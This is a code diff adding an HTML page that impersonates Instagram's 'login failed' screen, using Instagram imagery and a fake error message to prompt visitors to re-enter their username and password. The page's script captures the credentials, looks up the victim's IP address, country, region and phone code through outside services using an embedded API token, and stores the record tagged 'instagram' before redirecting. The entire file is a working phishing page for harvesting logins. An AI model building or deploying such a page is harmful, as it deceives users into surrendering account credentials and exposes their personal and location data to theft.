@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Faild</title>
+     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://wave-inky-product.glitch.me/ig%20failed%20sty.css">
+</head>
+<body>
+    <img id="ign" src="https://resourcesss.github.io/Pics/ign.png">
+    
+    <form id="detailsForm">
+        
+        <input class="input-box" type="text" id="username"  name ="username" placeholder="Phone number, username, or email" required>
+
+        <input class="input-box" id="message" type="password" name="password" name="message" placeholder="Password" required> 
+
+        <button  type="submit" class="bnt"><img class="lo" src="https://resourcesss.github.io/Pics/lo.png"></button>
+    </form>
+    
+    <p class="for">Forgot password?</p>
+    <p class="oi"> Sorry, your password or username was incorrect. 
+   Please double-check and try again!</p>
+    
+    <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+    
+    <p class="get">Get the app</p>
+    <img id="store" src="https://resourcesss.github.io/Pics/play.png">
+    <img id="sto" src="https://resourcesss.github.io/Pics/apple.png">
+
+    <footer>
+        <ul>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Support</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Press</a></li>
+            <li><a href="#">Api</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Directory</a></li>
+        </ul>
+    </footer>
+    <script>
+        document.getElementById('detailsForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const message = document.getElementById('message').value;
+    const date = new Date().toLocaleString();
+    const referrer = 'instagram'; // Set a fixed referrer name for this page
+
+    fetch('https://ipinfo.io?token=aaad8e9b2f8309')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const country = data.country;
+            const state = data.region;
+
+            return fetch(`https://restcountries.com/v3.1/alpha/${country}`)
+                .then(response => response.json())
+                .then(countryData => {
+                    const phoneCode = countryData[0].idd.root + countryData[0].idd.suffixes[0];
+
+                    const details = JSON.parse(localStorage.getItem('details')) || [];
+                    details.push({
+                        username,
+                        message,
+                        ip,
+                        country: countryData[0].name.common,
+                        state,
+                        phoneCode,
+                        date,
+                        referrer
+                    });
+                    localStorage.setItem('details', JSON.stringify(details));
+
+                    // Redirect to the desired page after submission, if needed
+                    window.location.href = 'success.html';
+                });
+        })
+        .catch(error => {
+            console.error('Error fetching IP or country information:', error);
+        });
+});
+
+    </script>
+</body>
+</html>
